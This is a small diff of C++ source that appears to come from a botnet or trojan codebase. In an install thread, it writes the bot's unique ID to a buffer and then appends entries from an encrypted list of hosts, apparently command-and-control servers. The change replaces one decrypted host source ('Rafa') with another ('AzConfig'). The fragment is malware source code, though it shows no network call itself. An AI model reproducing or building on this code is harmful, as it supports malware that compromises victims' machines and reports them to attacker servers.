@@ -1245,8 +1245,8 @@ static DWORD WINAPI ThreadInstallam(void*)
 			char* mem = (char*)HEAP::Alloc(1024);
 			char* p = mem;
 			p += pwsprintfA( mem, "%s\r\n", Bot->UID().t_str() );
-#ifdef RafaH
-			TStrEnum E( Rafa::Hosts(), RAFAHOSTS_PARAM_ENCRYPTED, 0x86D19DC3 /* __RAFA_HOSTS__ */ );
+#ifdef AzConfigH
+			TStrEnum E( GetAzHostsBuf(), AZCONFIG_PARAM_ENCRYPTED_HOSTS, 0);
 			while( E.Next() )
 				p += pwsprintfA( p, "%s\r\n", E.Line().t_str() );
 #endif
